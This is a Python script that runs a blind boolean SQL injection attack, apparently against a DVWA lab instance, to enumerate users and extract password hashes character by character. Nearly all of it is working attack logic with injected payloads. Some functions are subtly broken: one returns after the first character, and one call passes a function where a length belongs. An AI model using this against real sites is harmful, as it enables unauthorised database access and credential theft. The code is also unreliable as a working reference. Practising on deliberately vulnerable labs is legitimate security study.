#Using Python to exploit a vulnerable site with SQL injection
from bs4 import BeautifulSoup
import requests

#Track total number of queries
total_queries = 0
#using this charset to data that will be stored in hex
charset="0123456789abcdef"
#target website - DVWA SQL Injection 
target = "http://192.168.50.172"
needle="&Submit=Submit#"
def injected_query(payload):
	global total_queries
	r = requests.get(target,data={"username":"admin' and {}--,".format(payload),"password":"password"})
	total_queries+=1
	return needle.encode() not in r.content
#Creates Boolean query
def boolean_query(offset,user_id,character,operator=">"):
	payload="(select hex(substr(password,{},1)from user where id={}) {} hex('{}'))".format(offset+1,user_id,operator,character)
	return injected_query(payload)
#understand if a user is valid or not 
def invalid_user(user_id):
	payload = "(select id from user where id = {})>=0".format(user_id)
	return injected_query(payload)
#getting length of the hash within the database. Acquiring meta information from the query
#Guessing the size of the hash by starting at 0 & incrementing that guess until the response is false
#Previous length will be the length of the hash
def password_length(user_id):
	i = 0 
	while True: 
		payload = "(Select length(password) from user where id = {} and length(password)<= {} limit 1)".format(user_id,i)
		if not injected_query(payload):
			return i
		i+=1

#Extract the users hash by iterating over each hash character at a given index until the hash has been discovered
#iterate throught the whole hash comapring to the charset until the correct character is found and added to found
#Once loop is done it will break and return hash
def extract_hash(charset, user_id, password_length):
	found = ""
	for i in range(0,password_length):
		for j in range(len(charset)):
			if boolean_query(i,user_id,charset[j]):
				found+=charset[j]
				break
		return found
#Using a binary search to optimize the number of queries being performed
def extract_hash_bst(charset, user_id, password_length):
	found = ""
	for index in range(0,password_length):
		start = 0
		end = len(charset)-1
		while start <= end:
			if end - start == 1:
				if start == 0 and boolean_query(index, user_id, charset[start]):
					found+=charset[start]
				else:
					found+=charset[start-1]
				break
			else:
				middle = (start + end)//2
				if boolean_query(index,user_id,charset[middle]):
					end = middle
				else:
					start = middle
	return found
#See how many total queries have been made 	
def total_queries_taken():
	global total_queries
	print("\t\t[!] {} total queries!".format(total_queries))
	total_queries=0

while True: 
	try:
		user_id = input(">Enter User ID to extract password hash: ")
		if not invalid_user(user_id):
			user_password_length = password_length(user_id)
			print("\t[-] User {} hash length: {}".format(user_id,user_password_length))
			total_queries_taken()
			print("\t[-] User{} Hash: {}".format(user_id, extract_hash(charset, int(user_id), user_password_length)))
			total_queries_taken()
			print("\t[-] User {} Hash: {}".format(user_id, extract_hash_bst(charset, int(user_id),password_length)))
			total_queries_taken()
		else:
			print("\t[X] User {} does not Exist!".format(user_id))
	except KeyboardInterrupt:
			break